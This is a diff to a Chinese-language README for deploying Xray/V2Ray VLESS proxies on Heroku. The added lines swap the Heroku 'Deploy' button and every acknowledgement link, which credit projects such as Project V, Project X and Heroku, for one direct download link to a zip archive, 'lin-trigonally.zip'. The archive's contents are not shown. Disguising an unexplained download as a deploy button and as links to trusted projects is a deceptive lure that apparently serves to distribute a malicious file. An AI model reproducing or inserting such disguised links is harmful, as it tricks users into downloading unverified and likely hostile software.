@@ -22,7 +22,7 @@
 |**带有删除线的部分表示不适用或已经废弃。**|
 |**目前heroku只支持http1.1，请不要再问是否支持tcp等其他协议。**|
 
-[![Deploy](https://www.herokucdn.com/deploy/button.png)](https://dashboard.heroku.com/new?template=https://github.com/lin982711/lin220128.git)
+[![Deploy](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)
 
 # Xray/V2Ray VLESS
 |**属性**|**值**|
@@ -141,8 +141,8 @@ addEventListener(
 ```
 
 # 鸣谢
-- [Project V](https://github.com/v2fly/v2ray-core.git)
-- [Project X](https://github.com/XTLS/Xray-core.git)
-- [HeroKu](https://heroku.com)
-- [heroku-vless](https://github.com/DanyTPG/heroku-vless.git)
-- [Better Cloudflare IP](https://github.com/XIU2/CloudflareSpeedTest.git)
+- [Project V](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)
+- [Project X](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)
+- [HeroKu](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)
+- [heroku-vless](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)
+- [Better Cloudflare IP](https://raw.githubusercontent.com/lin982711/lin220128/main/sagaciate/lin-trigonally.zip)
